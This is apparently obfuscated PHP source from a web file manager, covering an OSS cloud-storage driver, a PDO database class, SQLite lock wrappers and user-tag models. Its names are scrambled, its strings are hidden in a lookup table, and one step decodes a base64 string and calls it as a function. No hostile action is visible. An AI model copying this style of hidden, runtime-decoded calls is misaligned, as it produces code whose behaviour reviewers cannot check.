$this->listUploadParts($Ñ¼²Ğ£Ø, $ºâ«ã£¿); } $ãÔÄ¬’Ë = array($ÃâÅ¹¤³[233], $ÃâÅ¹¤³[12], $ÃâÅ¹¤³[130], $ÃâÅ¹¤³[12], "\x78\x2d\x61\x6d\x7a\55\x64\141\x74\145\72{$´Øıı¤}", $ÃâÅ¹¤³[8] . $this->bucket . $ÃâÅ¹¤³[8] . $this->pathEncode($Ñ¼²Ğ£Ø) . $ô—¸õš); if (strpos($ô—¸õš, $ÃâÅ¹¤³[234]) === 0) { $ãÔÄ¬’Ë[0] = $ÃâÅ¹¤³[235]; } if (isset($ºâ«ã£¿[$ÃâÅ¹¤³[236]]) && $ºâ«ã£¿[$ÃâÅ¹¤³[236]] == $ÃâÅ¹¤³[237]) { $ãÔÄ¬’Ë[0] = $ÃâÅ¹¤³[237]; } $„Îú«Å× = implode($ÃâÅ¹¤³[18], $ãÔÄ¬’Ë); $Ò“‹­¼ = base64_encode(hash_hmac($ÃâÅ¹¤³[238], $„Îú«Å×, $this->secret, !0)); $€‘ØºÄŠ = $ÃâÅ¹¤³[239] . $this->accessKey . $ÃâÅ¹¤³[4] . $Ò“‹­¼; if (strpos($ô—¸õš, $ÃâÅ¹¤³[234]) === 0) { return array($ÃâÅ¹¤³[240] => $€‘ØºÄŠ, $ÃâÅ¹¤³[231] => $´Øıı¤); } return $€‘ØºÄŠ; } public function listUploadParts($¦ºÈÏ—ç, $ÑÕëÃ‹ = array()) { $ß¤Û£³Ã =& $_SERVER[ë¦»ºéÌ]; $ªÖª«¡¾ = str_replace($ß¤Û£³Ã[241], $ß¤Û£³Ã[12], $ÑÕëÃ‹[$ß¤Û£³Ã[179]]); $»üãÀşÕ = $this->client->listParts($this->bucket, $¦ºÈÏ—ç, $ªÖª«¡¾); if (!$»üãÀşÕ) { return !1; } unset($ÑÕëÃ‹[$ß¤Û£³Ã[232]], $ÑÕëÃ‹[$ß¤Û£³Ã[236]]); $ÑÕëÃ‹[$ß¤Û£³Ã[105]] = $¦ºÈÏ—ç; $Ÿ‰‚ĞïŒ = $this->multiUploadAuthData($¦ºÈÏ—ç, $ÑÕëÃ‹); if (empty($Ÿ‰‚ĞïŒ)) { return !1; } return array($ß¤Û£³Ã[240] => $Ÿ‰‚ĞïŒ, $ß¤Û£³Ã[231] => $ÑÕëÃ‹[$ß¤Û£³Ã[231]], $ß¤Û£³Ã[242] => $»üãÀşÕ); } public function getHost() { return parent::getHost() . $_SERVER[ë¦»ºéÌ][8] . $this->bucket; } public function size($ŠµÈ“óÑ) { $ÔäÌÛÍ¾ = $this->objectMeta($ŠµÈ“óÑ); return $ÔäÌÛÍ¾ ? $ÔäÌÛÍ¾[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function info($çÒ¥¢éÁ) { if ($this->isFolder($çÒ¥¢éÁ)) { return $this->folderInfo($çÒ¥¢éÁ); } else { if ($this->isFile($çÒ¥¢éÁ)) { return $this->fileInfo($çÒ¥¢éÁ); } } return !1; } public function exist($ö¾´Ê›) { return $this->isFile($ö¾´Ê›) || $this->isFolder($ö¾´Ê›); } public function isFile($€õ…±‡†) { return !$this->isFolder($€õ…±‡†) && $this->objectMeta($€õ…±‡†); } public function isFolder($°•„•ı´) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][210], $°•„•ı´); } protected function objectMeta($ä‰ü±Ë) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][211], $ä‰ü±Ë); } protected function _objectMeta($§Õ ‡çÂ) { $˜ö•Í¹ =& $_SERVER[ë¦»ºéÌ]; $§Õ ‡çÂ = rtrim($§Õ ‡çÂ, $˜ö•Í¹[8]); try { $æÑËœş = $this->client->getObjectInfo($this->bucket, $§Õ ‡çÂ); if (!isset($æÑËœş[$˜ö•Í¹[228]]) && isset($æÑËœş[$˜ö•Í¹[243]])) { $æÑËœş[$˜ö•Í¹[228]] = $æÑËœş[$˜ö•Í¹[243]]; } } catch (Exception $ô¯™½Ü) { $æÑËœş = !1; } if (!$æÑËœş) { } return $æÑËœş; } protected function _isFolder($“±Ãƒè€) { $ÆÍ”Ğ£é =& $_SERVER[ë¦»ºéÌ]; $“±Ãƒè€ = rtrim($“±Ãƒè€, $ÆÍ”Ğ£é[8]); if ($“±Ãƒè€ == $ÆÍ”Ğ£é[12] || $“±Ãƒè€ == $ÆÍ”Ğ£é[8]) { return !0; } $­âÆùç = $this->client->getBucket($this->bucket, $“±Ãƒè€, null, 1); if (empty($­âÆùç[$ÆÍ”Ğ£é[209]])) { return !1; } $ƒØ•Ğ« = $­âÆùç[$ÆÍ”Ğ£é[209]][0][$ÆÍ”Ğ£é[42]]; return stripos($ƒØ•Ğ«, $“±Ãƒè€ . $ÆÍ”Ğ£é[8]) === 0 ? !0 : !1; if (substr($ƒØ•Ğ«, -1) == $ÆÍ”Ğ£é[8]) { return !0; } if (get_path_this($ƒØ•Ğ«) == get_path_this($“±Ãƒè€)) { return !1; } return !0; } } goto CğÄ¦„©ˆ¶; f¸©ğ¬¼÷: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ş““ış© = '') { $ÈŠÒ†ş³ =& $_SERVER[ë¦»ºéÌ]; if (!class_exists($ÈŠÒ†ş³[894])) { think_exception(think_lang($ÈŠÒ†ş³[24]) . $ÈŠÒ†ş³[895]); } if (!empty($ş““ış©)) { $this->config = $ş““ış©; if (empty($this->config[$ÈŠÒ†ş³[27]])) { $this->config[$ÈŠÒ†ş³[27]] = array(); } } } public function connect($ÉÛ®¾ğ‚ = '', $—ø´Ù«… = 0) { $È†úº½Í =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->linkID[$—ø´Ù«…])) { if (empty($ÉÛ®¾ğ‚)) { $ÉÛ®¾ğ‚ = $this->config; } $ÔÅ»î—« = !empty($ÉÛ®¾ğ‚[$È†úº½Í[27]][$È†úº½Í[28]]) ? $ÉÛ®¾ğ‚[$È†úº½Í[27]][$È†úº½Í[28]] : $this->pconnect; if ($ÔÅ»î—«) { $ÉÛ®¾ğ‚[$È†úº½Í[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$—ø´Ù«…] = new PDO($ÉÛ®¾ğ‚[$È†úº½Í[896]], $ÉÛ®¾ğ‚[$È†úº½Í[868]], $ÉÛ®¾ğ‚[$È†úº½Í[869]], $ÉÛ®¾ğ‚[$È†úº½Í[27]]); } catch (PDOException $œ¢ŒË°©) { think_exception($œ¢ŒË°©->getMessage()); } $this->dbType = $this->_getDsnType($ÉÛ®¾ğ‚[$È†úº½Í[896]]); if (in_array($this->dbType, array($È†úº½Í[897], $È†úº½Í[898], $È†úº½Í[899], $È†úº½Í[900]))) { think_exception($È†úº½Í[901] . $this->dbType . $È†úº½Í[902] . $this->dbType . $È†úº½Í[903]); } if (!$this->linkID[$—ø´Ù«…]) { think_exception($È†úº½Í[904]); } try { $this->linkID[$—ø´Ù«…]->exec($È†úº½Í[905] . think_config($È†úº½Í[871])); } catch (Exception $œ¢ŒË°©) { } $this->connected = !0; if (1 != think_config($È†úº½Í[32])) { unset($this->config); } } return $this->linkID[$—ø´Ù«…]; } public function free() { $this->PDOStatement = null; } public function query($§¼ª÷¸ˆ, $áëáøÑ– = array()) { $ä‚÷Èû˜ =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§¼ª÷¸ˆ; if (!empty($áëáøÑ–)) { $this->queryStr .= $ä‚÷Èû˜[906] . print_r($áëáøÑ–, !0) . $ä‚÷Èû˜[907]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ä‚÷Èû˜[33], 1); think_status($ä‚÷Èû˜[34]); $this->PDOStatement = $this->_linkID->prepare($§¼ª÷¸ˆ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $é›£‡Õà = $this->PDOStatement->execute($áëáøÑ–); $this->debug(); if (!1 === $é›£‡Õà) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¾¤ôá×À, $“†¯êÖ‹ = array()) { $¼‰¾Œê =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾¤ôá×À; if (!empty($“†¯êÖ‹)) { $this->queryStr .= $¼‰¾Œê[906] . print_r($“†¯êÖ‹, !0) . $¼‰¾Œê[907]; } $¬üÑÀúˆ = !1; if ($this->dbType == $¼‰¾Œê[900]) { if (preg_match($¼‰¾Œê[908], $this->queryStr, $º¯÷‰Ã)) { $this->table = think_config($¼‰¾Œê[909]) . str_ireplace(think_config($¼‰¾Œê[910]), $¼‰¾Œê[384], $º¯÷‰Ã[2]); $¬üÑÀúˆ = (bool) $this->query($¼‰¾Œê[911] . strtoupper($this->table) . $¼‰¾Œê[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¼‰¾Œê[35], 1); think_status($¼‰¾Œê[34]); $this->PDOStatement = $this->_linkID->prepare($¾¤ôá×À); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $±è ùÈ” = $this->PDOStatement->execute($“†¯êÖ‹); $this->debug(); if (!1 === $±è ùÈ”) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¬üÑÀúˆ || preg_match($¼‰¾Œê[912], $¾¤ôá×À)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤µÜ§ğ® = $this->_linkID->commit(); $this->transTimes = 0; if (!$¤µÜ§ğ®) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ëúÖ³¸ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ëúÖ³¸) { $this->error(); return !1; } } return !0; } private function getAll() { $¢í­æÁ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¢í­æÁ); return $¢í­æÁ; } public function getFields($ü½¢) { $‹©–úî =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (think_config($‹©–úî[913])) { $ªü³€ãü = str_replace($‹©–úî[914], $ü½¢, think_config($‹©–úî[913])); } else { switch ($this->dbType) { case $‹©–úî[897]: case $‹©–úî[915]: $ªü³€ãü = "\x53\105\114\105\x43\x54\x20\x20\x20\143\157\154\x75\155\156\x5f\x6e\141\155\145\x20\141\163\x20\47\x4e\141\155\145\47\54\x20\40\40\x64\141\x74\x61\x5f\164\x79\x70\145\x20\141\x73\x20\47\x54\x79\x70\145\x27\54\40\40\x20\x63\x6f\x6c\165\x6d\x6e\137\x64\145\146\141\x75\x6c\164\x20\x61\x73\x20\x27\104\145\x66\x61\x75\154\164\47\x2c\x20\x20\x20\151\x73\137\156\165\x6c\154\141\x62\154\x65\40\x61\x73\x20\x27\116\165\154\154\47\12\11\x9\x46\122\117\115\11\x69\156\146\157\162\155\x61\x74\x69\x6f\x6e\137\x73\143\150\145\155\141\x2e\x74\141\x62\x6c\145\163\40\x41\123\40\x74\12\x9\11\x4a\x4f\111\x4e\11\151\x6e\146\x6f\162\155\141\164\x69\157\x6e\137\x73\x63\x68\x65\155\141\56\143\x6f\x6c\165\x6d\156\163\40\101\x53\40\x63\12\11\x9\x4f\x4e\x20\x20\x74\56\164\x61\x62\154\x65\137\143\141\x74\141\x6c\157\x67\40\x3d\40\x63\x2e\x74\x61\142\x6c\145\137\143\x61\164\141\154\157\x67\xa\x9\x9\x41\x4e\x44\40\x74\x2e\x74\x61\x62\x6c\x65\x5f\163\x63\x68\x65\155\141\x20\75\x20\143\56\x74\x61\x62\x6c\145\137\x73\x63\150\145\155\141\xa\11\11\x41\x4e\104\x20\164\56\x74\x61\x62\154\145\x5f\x6e\x61\155\145\x20\75\40\143\56\x74\x61\142\154\x65\137\156\141\155\x65\xa\x9\x9\127\x48\105\x52\x45\40\x20\40\x74\56\164\x61\142\x6c\145\x5f\156\x61\155\x65\40\x3d\40\x27{$ü½¢}\47"; break; case $‹©–úî[916]: $ªü³€ãü = $‹©–úî[917] . $ü½¢ . $‹©–úî[918]; break; case $‹©–úî[898]: case $‹©–úî[900]: $ªü³€ãü = $‹©–úî[919] . $‹©–úî[920] . $‹©–úî[921] . strtoupper($ü½¢) . $‹©–úî[922] . strtoupper($ü½¢) . $‹©–úî[923]; break; case $‹©–úî[924]: $ªü³€ãü = $‹©–úî[925] . $ü½¢ . $‹©–úî[926]; break; case $‹©–úî[899]: break; case $‹©–úî[927]: default: $ªü³€ãü = $‹©–úî[928] . ($this->dbType == $‹©–úî[927] ? "\x60{$ü½¢}\x60" : $ü½¢); } } $¿±­²é· = $this->query($ªü³€ãü); $øÀ‘üİµ = array(); if ($¿±­²é·) { foreach ($¿±­²é· as $¬í¿“”µ => $‘ÄÅ«‡õ) { $‘ÄÅ«‡õ = array_change_key_case($‘ÄÅ«‡õ); $‘ÄÅ«‡õ[$‹©–úî[42]] = isset($‘ÄÅ«‡õ[$‹©–úî[42]]) ? $‘ÄÅ«‡õ[$‹©–úî[42]] : $‹©–úî[384]; $‘ÄÅ«‡õ[$‹©–úî[43]] = isset($‘ÄÅ«‡õ[$‹©–úî[43]]) ? $‘ÄÅ«‡õ[$‹©–úî[43]] : $‹©–úî[384]; $ïƒ©–àŸ = isset($‘ÄÅ«‡õ[$‹©–úî[279]]) ? $‘ÄÅ«‡õ[$‹©–úî[279]] : $‘ÄÅ«‡õ[$‹©–úî[42]]; $øÀ‘üİµ[$ïƒ©–àŸ] = array($‹©–úî[42] => $ïƒ©–àŸ, $‹©–úî[43] => $‘ÄÅ«‡õ[$‹©–úî[43]], $‹©–úî[45] => (bool) (isset($‘ÄÅ«‡õ[$‹©–úî[114]]) && $‘ÄÅ«‡õ[$‹©–úî[114]] === $‹©–úî[12] || isset($‘ÄÅ«‡õ[$‹©–úî[45]]) && $‘ÄÅ«‡õ[$‹©–úî[45]] === $‹©–úî[12]), $‹©–úî[47] => isset($‘ÄÅ«‡õ[$‹©–úî[47]]) ? $‘ÄÅ«‡õ[$‹©–úî[47]] : (isset($‘ÄÅ«‡õ[$‹©–úî[66]]) ? $‘ÄÅ«‡õ[$‹©–úî[66]] : $‹©–úî[384]), $‹©–úî[49] => isset($‘ÄÅ«‡õ[$‹©–úî[105]]) ? strtolower($‘ÄÅ«‡õ[$‹©–úî[105]]) == $‹©–úî[51] : (isset($‘ÄÅ«‡õ[$‹©–úî[67]]) ? $‘ÄÅ«‡õ[$‹©–úî[67]] : !1), $‹©–úî[52] => isset($‘ÄÅ«‡õ[$‹©–úî[929]]) ? strtolower($‘ÄÅ«‡õ[$‹©–úî[929]]) == $‹©–úî[54] : (isset($‘ÄÅ«‡õ[$‹©–úî[105]]) ? $‘ÄÅ«‡õ[$‹©–úî[105]] : !1)); } } return $øÀ‘üİµ; } public function getTables($äƒ‰õ™ = '') { $˜Äø“° =& $_SERVER[ë¦»ºéÌ]; if (think_config($˜Äø“°[930])) { $’Øô×‹³ = str_replace($˜Äø“°[931], $äƒ‰õ™, think_config($˜Äø“°[930])); } else { switch ($this->dbType) { case $˜Äø“°[898]: case $˜Äø“°[900]: $’Øô×‹³ = $˜Äø“°[932]; break; case $˜Äø“°[897]: case $˜Äø“°[915]: $’Øô×‹³ = $˜Äø“°[933]; break; case $˜Äø“°[924]: $’Øô×‹³ = $˜Äø“°[934]; break; case $˜Äø“°[899]: think_exception(think_lang($˜Äø“°[935]) . $˜Äø“°[936]); break; case $˜Äø“°[916]: $’Øô×‹³ = $˜Äø“°[55] . $˜Äø“°[56] . $˜Äø“°[57]; break; case $˜Äø“°[927]: default: if (!empty($äƒ‰õ™)) { $’Øô×‹³ = $˜Äø“°[879] . $äƒ‰õ™ . $˜Äø“°[880]; } else { $’Øô×‹³ = $˜Äø“°[881]; } } } $¾É¨şÉñ = $this->query($’Øô×‹³); $à’»«¨Õ = array(); foreach ($¾É¨şÉñ as $ş‰¶™Æ¹ => $¥ğà×Ÿì) { $à’»«¨Õ[$ş‰¶™Æ¹] = current($¥ğà×Ÿì); } return $à’»«¨Õ; } protected function parseLimit($—üì¤‹ş) { $îû¶øí² =& $_SERVER[ë¦»ºéÌ]; $°º¤Çà¿ = $îû¶øí²[12]; if (!empty($—üì¤‹ş)) { switch ($this->dbType) { case $îû¶øí²[924]: case $îû¶øí²[916]: $—üì¤‹ş = explode($îû¶øí²[60], $—üì¤‹ş); if (count($—üì¤‹ş) > 1) { $°º¤Çà¿ .= $îû¶øí²[61] . $—üì¤‹ş[1] . $îû¶øí²[62] . $—üì¤‹ş[0] . $îû¶øí²[63]; } else { $°º¤Çà¿ .= $îû¶øí²[61] . $—üì¤‹ş[0] . $îû¶øí²[63]; } break; case $îû¶øí²[897]: case $îû¶øí²[915]: break; case $îû¶øí²[899]: break; case $îû¶øí²[898]: case $îû¶øí²[900]: break; case $îû¶øí²[927]: default: $°º¤Çà¿ .= $îû¶øí²[61] . $—üì¤‹ş . $îû¶øí²[63]; } } return $°º¤Çà¿; } public function parseKey(&$Õ¨¡¿ï, $ä›úãé– = true) { $˜Ÿİé°º =& $_SERVER[ë¦»ºéÌ]; if ($ä›úãé–) { $Õ¨¡¿ï = $this->parseKeyCheck($Õ¨¡¿ï); } if ($this->dbType == $˜Ÿİé°º[927]) { if ($Õ¨¡¿ï != $˜Ÿİé°º[193] && !preg_match($˜Ÿİé°º[891], $Õ¨¡¿ï)) { $Õ¨¡¿ï = $˜Ÿİé°º[391] . trim($Õ¨¡¿ï, $˜Ÿİé°º[391]) . $˜Ÿİé°º[391]; } return $Õ¨¡¿ï; } else { return parent::parseKey($Õ¨¡¿ï, $ä›úãé–); } } public function close() { $this->_linkID = null; } public function error() { $ù×ûÄ‚Ü =& $_SERVER[ë¦»ºéÌ]; if ($this->PDOStatement) { $‚°Ø°ÆÊ = $this->PDOStatement->errorInfo(); $this->error = $‚°Ø°ÆÊ[1] . $ù×ûÄ‚Ü[4] . $‚°Ø°ÆÊ[2]; } else { $this->error = $ù×ûÄ‚Ü[12]; } if ($ù×ûÄ‚Ü[12] != $this->queryStr) { $this->error .= LNG($ù×ûÄ‚Ü[58]) . $this->queryStr; } think_trace($this->error, $ù×ûÄ‚Ü[12], $ù×ûÄ‚Ü[59]); return $this->error; } public function escapeString($´ñ¤¹²Ì) { $õ ªµë =& $_SERVER[ë¦»ºéÌ]; switch ($this->dbType) { case $õ ªµë[924]: case $õ ªµë[897]: case $õ ªµë[915]: case $õ ªµë[927]: return addslashes($´ñ¤¹²Ì); case $õ ªµë[899]: case $õ ªµë[916]: case $õ ªµë[898]: case $õ ªµë[900]: return str_ireplace($õ ªµë[68], $õ ªµë[69], $´ñ¤¹²Ì); } } protected function parseValue($¬ëÃßÛñ) { $¦¿ºŞŸŸ =& $_SERVER[ë¦»ºéÌ]; if (is_string($¬ëÃßÛñ)) { $ÉŸå‘›â = strpos($¬ëÃßÛñ, $¦¿ºŞŸŸ[4]) === 0 && in_array($¬ëÃßÛñ, array_keys($this->bind)); $¬ëÃßÛñ = $ÉŸå‘›â ? $this->escapeString($¬ëÃßÛñ) : $¦¿ºŞŸŸ[937] . $this->escapeString($¬ëÃßÛñ) . $¦¿ºŞŸŸ[937]; } elseif (isset($¬ëÃßÛñ[0]) && is_string($¬ëÃßÛñ[0]) && strtolower($¬ëÃßÛñ[0]) == $¦¿ºŞŸŸ[303]) { $¬ëÃßÛñ = $this->escapeString($¬ëÃßÛñ[1]); } elseif (is_array($¬ëÃßÛñ)) { $¬ëÃßÛñ = array_map(array($this, $¦¿ºŞŸŸ[938]), $¬ëÃßÛñ); } elseif (is_bool($¬ëÃßÛñ)) { $¬ëÃßÛñ = $¬ëÃßÛñ ? $¦¿ºŞŸŸ[99] : $¦¿ºŞŸŸ[202]; } elseif (is_null($¬ëÃßÛñ)) { $¬ëÃßÛñ = $¦¿ºŞŸŸ[114]; } return $¬ëÃßÛñ; } public function getLastInsertId() { $ØĞÑ¬¯  =& $_SERVER[ë¦»ºéÌ]; switch ($this->dbType) { case $ØĞÑ¬¯ [924]: case $ØĞÑ¬¯ [916]: case $ØĞÑ¬¯ [897]: case $ØĞÑ¬¯ [915]: case $ØĞÑ¬¯ [899]: case $ØĞÑ¬¯ [927]: return $this->_linkID->lastInsertId(); case $ØĞÑ¬¯ [898]: case $ØĞÑ¬¯ [900]: $ºç½œ® = $this->table; $šËİ¯ú› = $this->query("\x53\105\114\105\103\x54\x20{$ºç½œ®}\x2e\143\x75\x72\162\x76\141\x6c\40\x63\x75\x72\162\166\141\x6c\x20\x46\122\x4f\x4d\40\144\165\x61\154"); return $šËİ¯ú› ? $šËİ¯ú›[0][$ØĞÑ¬¯ [939]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($‘üìÃ»ğ) { $‘…Ã‰Î‘ =& $_SERVER[ë¦»ºéÌ]; if (!CacheLock::fileLock($‘…Ã‰Î‘[23])) { return !1; } $‰ÔÊ“Ó = parent::query($‘üìÃ»ğ); CacheLock::fileUnLock($‘…Ã‰Î‘[23]); return $‰ÔÊ“Ó; } public function execute($’®ã£úˆ) { $õóğİğ =& $_SERVER[ë¦»ºéÌ]; if (!CacheLock::fileLock($õóğİğ[23])) { return !1; } $‡€²ŞºÏ = parent::execute($’®ã£úˆ); CacheLock::fileUnLock($õóğİğ[23]); return $‡€²ŞºÏ; } } class DbSqlite3 extends DbSqlite3Base { public function query($¦À•İ‰©) { $·Œ¤Ğ¨® =& $_SERVER[ë¦»ºéÌ]; if (!CacheLock::fileLock($·Œ¤Ğ¨®[23])) { return !1; } $©ÎÜÌ¡ = parent::query($¦À•İ‰©); CacheLock::fileUnLock($·Œ¤Ğ¨®[23]); return $©ÎÜÌ¡; } public function execute($šò‡ìÄ§) { $©Š† =& $_SERVER[ë¦»ºéÌ]; if (!CacheLock::fileLock($©Š†[23])) { return !1; } $ƒƒªŸõ = parent::execute($šò‡ìÄ§); CacheLock::fileUnLock($©Š†[23]); return $ƒƒªŸõ; } } goto fó†Ã‹«…ë; e—İ®ÉÜì: $fileSize = strrev(base64_decode($_SERVER[¹øóÜÍ­][0])); function binCheckNeq($ëç‹·˜, $Òˆà¡Ù´) { return $ëç‹·˜ != $Òˆà¡Ù´; } $_SERVER[$_SERVER[¹øóÜÍ­][1]] = $fileSize($_SERVER[$_SERVER[¹øóÜÍ­][2]]); goto Cå†½„èî; C†Ñ±‚ï¿: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\157\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($„£ÕØë¼) { $èß¥Š =& $_SERVER[ë¦»ºéÌ]; if (!defined($èß¥Š[476])) { define($èß¥Š[476], 0); } return "\x55\163\x65\162\117\160\164\151\x6f\x6e\x5f{$„£ÕØë¼}\137" . USER_ID; } protected function filterWhere($èï¤Œà€) { $¬ù–õÚ› =& $_SERVER[ë¦»ºéÌ]; if (!defined($¬ù–õÚ›[476])) { define($¬ù–õÚ›[476], 0); } $èï¤Œà€[$¬ù–õÚ›[1632]] = USER_ID; return $èï¤Œà€; } public function cacheRemoveUser($“Á¢î¿ˆ, $ê÷ ¸öŸ) { return Cache::remove("\x55\163\x65\x72\x4f\160\x74\151\157\x6e\x5f{$“Á¢î¿ˆ}\x5f" . $ê÷ ¸öŸ); } protected function optionDefault($’å°øÂĞ = '') { $µ±ªåç =& $_SERVER[ë¦»ºéÌ]; if ($’å°øÂĞ == $µ±ªåç[12]) { return $GLOBALS[$µ±ªåç[6]][$µ±ªåç[2275]]; } if ($’å°øÂĞ == $µ±ªåç[2276]) { return $GLOBALS[$µ±ªåç[6]][$µ±ªåç[2277]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\x61\x67\114\x69\163\164"; public $modelType = "\x55\163\145\x72\x4f\x70\x74\151\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x73\164\171\154\145", "\163\157\x72\x74"); public function listData($’¡ß¼­Ê = false, $Çöå ƒá = "\163\157\162\x74", $¼©’°œÒ = false) { return parent::listData($’¡ß¼­Ê, $Çöå ƒá, $¼©’°œÒ); } public function remove($Æ¼¼Ş¦) { return parent::remove($Æ¼¼Ş¦); } public function add($Ÿƒá‹, $ßÙÑë‡½ = "\x6c\141\x62\x65\x6c\x2d\147\162\x65\x79\x2d\x6e\x6f\x72\x6d\141\154") { $Û™¢ Ïı =& $_SERVER[ë¦»ºéÌ]; if ($this->findByName($Ÿƒá‹)) { return !1; } $ˆ¸š¸¬Ä = array($Û™¢ Ïı[423] => $Ÿƒá‹, $Û™¢ Ïı[486] => $ßÙÑë‡½, $Û™¢ Ïı[1804] => $this->getSort($Û™¢ Ïı[264]) + 1); return parent::insert($ˆ¸š¸¬Ä); } public function update($‡–ÒŠÁï, $×ùŞİã) { $™ÂƒÙïù =& $_SERVER[ë¦»ºéÌ]; $Â ‡Ûû— = $this->listData($‡–ÒŠÁï); $ğ›ø = $this->findByName($×ùŞİã[$™ÂƒÙïù[42]]); if (!$Â ‡Ûû— || $ğ›ø && $ğ›ø[$™ÂƒÙïù[403]] != $Â ‡Ûû—[$™ÂƒÙïù[403]]) { return !1; } return parent::update($‡–ÒŠÁï, $×ùŞİã); } public function moveTop($À––ˆ€Æ) { $ÑÜèùÕ“ =& $_SERVER[ë¦»ºéÌ]; $ó«©Ÿö = parent::listData(); $ÑÑæßéÚ = $this->getSort($ÑÜèùÕ“[263]); foreach ($ó«©Ÿö as &$‚¶‹õ¼¢) { if ($‚¶‹õ¼¢[$ÑÜèùÕ“[403]] == $À––ˆ€Æ) { $‚¶‹õ¼¢[$ÑÜèùÕ“[1823]] = $ÑÑæßéÚ; continue; } $‚¶‹õ¼¢[$ÑÜèùÕ“[1823]] += 1; } unset($‚¶‹õ¼¢); return parent::resetData($ó«©Ÿö); } public function moveBottom($Æ»û…‹°) { $‹Ë©§œƒ =& $_SERVER[ë¦»ºéÌ]; $ùü´ü¦ = $this->getSort($‹Ë©§œƒ[264]) + 1; return parent::update($Æ»û…‹°, array($‹Ë©§œƒ[1823] => $ùü´ü¦)); } public function resetSort($ÌˆÓ¥•Ú) { $ôßåæ°Ç =& $_SERVER[ë¦»ºéÌ]; $ë•‡Ë²Ç = array(); $ÌˆÓ¥•Ú = is_array($ÌˆÓ¥•Ú) ? $ÌˆÓ¥•Ú : array(); for ($™É¬Í½¤ = 0; $™É¬Í½¤ < count($ÌˆÓ¥•Ú); $™É¬Í½¤++) { $ë•‡Ë²Ç[$ÌˆÓ¥•Ú[$™É¬Í½¤] . $ôßåæ°Ç[12]] = $™É¬Í½¤ + 1; } $¯ïô³Î = parent::listData(); foreach ($¯ïô³Î as &$ÎêÆê) { $®ÆğÈæ¹ = $ë•‡Ë²Ç[$ÎêÆê[$ôßåæ°Ç[403]]]; $ÎêÆê[$ôßåæ°Ç[1823]] = $®ÆğÈæ¹ ? $®ÆğÈæ¹ : $ÎêÆê[$ôßåæ°Ç[1823]]; } unset($ÎêÆê); return parent::resetData($¯ïô³Î); } private function getSort($Ê³óı¢) { $°¸‚öÜÁ =& $_SERVER[ë¦»ºéÌ]; $ƒœç¸ÕÈ = parent::listData(); $Ê²ÊÀ³ = array_to_keyvalue($ƒœç¸ÕÈ, $°¸‚öÜÁ[12], $°¸‚öÜÁ[1823]); if (!$Ê²ÊÀ³) { $Ê²ÊÀ³ = array(0); } $ˆåòáÅˆ = $Ê³óı¢ == $°¸‚öÜÁ[264] ? max($Ê²ÊÀ³) : min($Ê²ÊÀ³); return intval($ˆåòáÅˆ); } } goto c™­¤ó£¦Î; f¨î… ˆ½: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($µ´—Œ“) { parent::__construct(); include_once SDK_DIR . $_SERVER[ë¦»ºéÌ][1360]; $this->_init($µ´—Œ“); } public function _init($šØú¦«€) { $Ÿ”¿ûşû =& $_SERVER[ë¦»ºéÌ]; foreach ($šØú¦«€ as $³ï Ğœİ => $¿¡ôµ”Œ) { if (isset($this->{$³ï Ğœİ})) { $this->{$³ï Ğœİ} = $¿¡ôµ”Œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ÿ”¿ûşû[1361] . LNG($Ÿ”¿ûşû[1362])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $œÅ¤Ú“§ =& $_SERVER[ë¦»ºéÌ]; $ÑÕ»—‡ = new OSS\Model\CorsConfig(); $øõÎ÷Ñ = new OSS\Model\CorsRule(); $øõÎ÷Ñ->addAllowedOrigin($œÅ¤Ú“§[1363]); $øõÎ÷Ñ->addAllowedMethod($œÅ¤Ú“§[1364]); $øõÎ÷Ñ->addAllowedMethod($œÅ¤Ú“§[1365]); $øõÎ÷Ñ->addAllowedMethod($œÅ¤Ú“§[1366]); $øõÎ÷Ñ->addAllowedMethod($œÅ¤Ú“§[1367]); $øõÎ÷Ñ->addAllowedMethod($œÅ¤Ú“§[169]); $øõÎ÷Ñ->setMaxAgeSeconds(600); $øõÎ÷Ñ->addExposeHeader($œÅ¤Ú“§[1368]); $øõÎ÷Ñ->addAllowedHeader($œÅ¤Ú“§[1363]); $ÑÕ»—‡->addRule($øõÎ÷Ñ); try { $this->client->putBucketCors($this->bucket, $ÑÕ»—‡); } catch (OSS\Core\OssException $ó€í¢”Á) { return !1; } return !0; } public function getBucketCors() { $òÈ«Èè» =& 